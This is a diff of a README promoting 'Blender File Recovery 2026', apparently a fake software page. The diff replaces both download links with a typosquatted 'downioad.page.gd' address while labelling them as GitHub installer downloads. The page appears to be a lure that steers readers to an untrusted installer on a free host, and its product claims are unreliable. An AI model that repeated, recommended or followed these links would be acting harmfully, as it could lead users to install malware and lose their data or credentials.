@@ -2,7 +2,7 @@
 
 Blender File Recovery 2026 is a comprehensive software solution tailored for Windows users to salvage and fix corrupted, accidentally deleted, or damaged .blend files from Blender. Whether you've encountered unexpected crashes, file corruption, or accidental deletion, this tool provides a reliable way to restore your valuable 3D projects.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside – Key Features
 
@@ -55,7 +55,7 @@ A4: The software includes an auto-update feature. You can also manually check fo
 
 For the latest version of Blender File Recovery 2026, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Support and Feedback
 
